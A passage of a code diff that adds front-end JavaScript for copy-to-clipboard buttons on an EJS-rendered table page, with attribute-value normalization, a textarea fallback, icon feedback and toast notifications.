+          const parentRow = valEl.closest('tr');
+          const assocBtn = parentRow ? parentRow.querySelector('.copy-btn') : null;
+          handleCopy(text, assocBtn || valEl);
+        }
+      });
+
+      function normalizeAttrValue(raw) {
+        // raw is JSON string produced server-side (e.g. "12345" or "some string").
+        // If raw starts and ends with quotes, strip them.
+        if (!raw) return '';
+        // When using EJS JSON.stringify inserted without outer quotes, raw will include quotes.
+        // Remove leading/trailing quotes if present:
+        if ((raw[0] === '"' && raw[raw.length-1] === '"') || (raw[0] === "'" && raw[raw.length-1] === "'")) {
+          try {
+            return JSON.parse(raw);
+          } catch (e) {
+            return raw.slice(1, -1);
+          }
+        }
+        return raw;
+      }
+
+      async function handleCopy(text, feedbackEl) {
+        if (!text) {
+          showCopyToast('Nothing to copy', true);
+          return;
+        }
+        try {
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            await navigator.clipboard.writeText(text);
+          } else {
+            // fallback
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            ta.style.position = 'fixed';
+            ta.style.left = '-9999px';
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            ta.remove();
+          }
+
+          // animate feedback element (button or value)
+          if (feedbackEl && feedbackEl.classList) {
+            feedbackEl.classList.add('copied');
+            const icon = feedbackEl.querySelector('i');
+            const priorClass = icon ? icon.className : null;
+            if (icon) icon.className = 'fas fa-check';
+            window.setTimeout(() => {
+              if (icon && priorClass) icon.className = priorClass;
+              if (feedbackEl.classList) feedbackEl.classList.remove('copied');
+            }, 1400);
+          }
+
+          showCopyToast(`Copied: ${shortenText(text, 36)}`);
+        } catch (err) {
+          console.error('Copy failed', err);
+          showCopyToast('Copy failed', true);
+        }
+      }
+
+      function showCopyToast(message, isError = false) {
+        if (!toast || !toastMsg) return;
+        toastMsg.textContent = message;
+        const icon = toast.querySelector('.toast-icon');
+        if (isError) {
+          icon.className = 'fas fa-exclamation-circle me-2 toast-icon';
+          icon.style.color = '#ff6b6b';
+        } else {
+          icon.className = 'fas fa-check-circle me-2 toast-icon';
+          icon.style.color = '#34d399';
+        }
+        toast.classList.add('show');
+
+        clearTimeout(toast._hideTimer);
+        toast._hideTimer = setTimeout(() => {
+          toast.classList.remove('show');
+        }, 1700);
+      }
+
+      function shortenText(s, maxLen = 36) {
+        if (!s) return '';
+        if (s.length <= maxLen) return s;
+        const half = Math.floor((maxLen - 1) / 2);
+        return s.slice(0, half) + '…' + s.slice(s.length - half);
+      }
+    })();
+  </script>
+
